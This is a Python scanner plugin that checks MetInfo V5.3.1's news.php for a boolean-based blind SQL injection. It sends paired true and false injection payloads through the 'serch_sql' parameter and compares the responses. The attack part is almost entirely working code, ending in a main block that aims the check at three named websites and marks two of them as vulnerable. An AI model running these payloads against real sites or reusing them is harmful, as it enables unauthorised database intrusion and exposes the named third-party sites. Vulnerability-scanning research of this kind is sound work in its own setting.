#!/usr/bin/env
#*_* coding: utf-8 *_*

#name: MetInfo V5.3.1 news.php sql注入
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2015-0119166

import re

def assign(service, arg):
    if service == 'metinfo':
        return True,arg

def audit(arg):
    #获取classid
    code, head, res, err, _ = curl.curl2(arg+'/news/')
    if code != 200:
        return False
    #print res
    m = re.search(r'(/news.php\?[a-zA-Z0-9&=]*class[\d]+=[\d]+)[\'"]', res)
    if m == None:
        return False
    #print m.group(1)
    #注入点
    #条件真
    payload = arg + 'news' + m.group(1) + '&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>0,1,0)%20limit%201--%20sd&imgproduct=xxxx'
    #条件假
    verify = arg + 'news' + m.group(1) + '&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>255,1,0)%20limit%201--%20sd&imgproduct=xxxx'
    #print payload
    #proxy = ('127.0.0.1', 8887)
    code, head, payload_res, err, _ = curl.curl2(payload)
    if code != 200:
        return False
    code, head, verify_res, err, _ = curl.curl2(verify)
    if code != 200:
        return False
    #判断页面中是否有新闻
    pattern = re.compile(r'<h2><a href=[\'"]?[./a-zA-Z0-9_-]*shownews.php\?')
    if pattern.search(payload_res) and pattern.search(verify_res) == None:
        security_hole(arg + ' metinfo cms news.php blind sql injection')
    else:
        return False
if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.yi-hangic.com/')[1])    #存在漏洞
    audit(assign('metinfo', 'http://www.mbp.com.hk/')[1])      #存在漏洞
    audit(assign('metinfo', 'http://demo.metinfo.cn/')[1])      #不存在漏洞